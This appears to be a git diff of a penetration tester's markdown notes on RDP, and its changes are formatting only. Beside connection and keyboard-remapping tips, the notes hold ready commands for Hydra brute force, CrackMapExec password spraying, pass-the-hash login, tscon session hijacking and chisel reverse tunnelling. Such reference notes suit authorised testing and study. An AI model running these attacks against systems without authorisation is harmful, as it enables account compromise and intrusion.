@@ -1,17 +1,19 @@
 # rdp
 
-**Author:** Julien Bongars  
+**Author:** Julien Bongars\
 **Date:** 2025-12-29 23:37:33
-**Path:** 
+**Path:**
 
 ---
 
 ## Overview
+
 RDP (Remote Desktop Protocol) is Microsoft's proprietary protocol for remote GUI access to Windows systems. Default port is **3389/TCP**.
 
 ## Enumeration
 
 ### Port Scanning
+
 ```bash
 # Nmap scan for RDP
 nmap -p 3389 -sV -sC {TARGET_IP}
@@ -21,6 +23,7 @@ nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 {TARGET_IP}
 ```
 
 ### Check if RDP is accessible
+
 ```bash
 # Using netcat
 nc -nv {TARGET_IP} 3389
@@ -34,6 +37,7 @@ nmap -p 3389 --open {TARGET_IP}
 ### Remmina (Recommended)
 
 ### xfreerdp (Not super compatible with Dvorak)
+
 ```bash
 # Basic connection
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD}
@@ -56,16 +60,19 @@ You can solve this by using [keyd](https://github.com/rvaiya/keyd) to remap Dvor
 #### Running keyd for remapping
 
 To start keyd and terminate it on any keypress:
+
 ```bash
 sudo bash -c 'keyd & PID=$! ; read -n1 -r ; kill $PID'
 ```
 
 #### Configuration: /etc/keyd/default.conf
+
 see appendix
 
 **Note** Using keyd breaks the key mapping in the host machine. Still thinking about a solution to resolve this.
 
 ### rdesktop (Alternative)
+
 ```bash
 # Basic connection
 rdesktop -u {USERNAME} -p {PASSWORD} {TARGET_IP}
@@ -75,6 +82,7 @@ rdesktop -u {DOMAIN}\\{USERNAME} -p {PASSWORD} {TARGET_IP}
 ```
 
 ### Windows RDP Client (mstsc)
+
 ```cmd
 mstsc /v:{TARGET_IP}
 ```
@@ -99,6 +107,7 @@ $client.Close()
 ## Password Attacks
 
 ### Hydra Brute Force
+
 ```bash
 # Single user
 hydra -l {USERNAME} -t 4 -P /usr/share/wordlists/rockyou.txt rdp://{TARGET_IP}
@@ -108,6 +117,7 @@ hydra -L users.txt -t 4 -P /usr/share/wordlists/rockyou.txt rdp://{TARGET_IP}
 ```
 
 ### CrackMapExec
+
 ```bash
 # Single credential test
 crackmapexec rdp {TARGET_IP} -u {USERNAME} -p {PASSWORD}
@@ -122,6 +132,7 @@ crackmapexec rdp {TARGET_IP} -u users.txt -p passwords.txt
 ## Pass-the-Hash (Restricted Transport)
 
 ### Using xfreerdp with hash
+
 ```bash
 # Note: Requires Restricted Admin mode enabled on target
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /pth:{NTLM_HASH} /cert:ignore
@@ -130,12 +141,14 @@ xfreerdp /v:{TARGET_IP} /u:{USERNAME} /pth:{NTLM_HASH} /cert:ignore
 ## Session Hijacking (Post-Exploitation)
 
 ### List active sessions
+
 ```cmd
 query user
 qwinsta
 ```
 
 ### Hijack session (requires SYSTEM or appropriate privileges)
+
 ```cmd
 # Switch to session without password
 tscon {SESSION_ID} /dest:{CURRENT_SESSION}
@@ -147,6 +160,7 @@ tscon 2 /dest:rdp-tcp#0
 ## Port Forwarding / Tunneling
 
 ### SSH Local Port Forward
+
 ```bash
 # Forward local port 3389 to remote RDP
 ssh -L 3389:{TARGET_IP}:3389 {USER}@{PIVOT_HOST}
@@ -156,6 +170,7 @@ xfreerdp /v:127.0.0.1 /u:{USERNAME} /p:{PASSWORD}
 ```
 
 ### Chisel Tunnel
+
 ```bash
 # On attacker machine (server)
 chisel server -p 8000 --reverse
@@ -170,12 +185,14 @@ xfreerdp /v:127.0.0.1:3389 /u:{USERNAME} /p:{PASSWORD}
 ## Common Issues & Fixes
 
 ### Certificate Errors
+
 ```bash
 # Add /cert:ignore flag
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /cert:ignore
 ```
 
 ### Authentication Failures
+
 ```bash
 # Try without domain
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD}
@@ -188,6 +205,7 @@ xfreerdp /v:{TARGET_IP} /u:{COMPUTER_NAME}\\{USERNAME} /p:{PASSWORD}
 ```
 
 ### Network Level Authentication (NLA) Issues
+
 ```bash
 # Older xfreerdp versions may need
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /sec:nla
@@ -197,6 +215,7 @@ xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /sec:rdp
 ```
 
 ### Resolution Issues
+
 ```bash
 # Dynamic resolution (scales with window)
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /dynamic-resolution
@@ -208,6 +227,7 @@ xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /smart-sizing
 ## Post-Connection Tips
 
 ### File Transfer
+
 ```bash
 # Mount local share during connection
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /drive:share,/tmp
@@ -216,12 +236,14 @@ xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /drive:share,/tmp
 ```
 
 ### Copy/Paste
+
 ```bash
 # Enable clipboard
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} +clipboard
 ```
 
 ### Disconnect vs Logout
+
 - **Disconnect**: Session remains active (uses resources)
 - **Logout**: Terminates session completely
 
@@ -261,6 +283,7 @@ query session
 ## Appendix
 
 ### Configuration: /etc/keyd/default.conf
+
 ```config
 [ids]
 *
@@ -312,4 +335,3 @@ comma = w
 # # Toggle between normal and dvorak_to_qwerty with ScrollLock
 # scrolllock = swap(dvorak_to_qwerty)
 ```
-
